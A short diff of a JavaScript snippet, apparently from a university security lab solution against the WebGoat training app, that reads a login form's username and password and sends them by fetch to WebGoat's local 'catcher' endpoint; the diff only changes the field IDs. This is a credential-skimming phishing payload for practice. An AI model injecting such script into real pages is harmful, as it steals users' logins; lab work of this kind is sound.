@@ -1,7 +1,7 @@
 <script>
     function myFunction() {
-        var username = document.getElementById("user").value; 
-        var password = document.getElementById("pass").value; 
+        var username = document.getElementById("ece568-2020-user").value; 
+        var password = document.getElementById("ece568-2020-pass").value; 
         var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishUsername=" + username + "&phishPassword=" + password;
         fetch(url, {method: "POST"});
     }
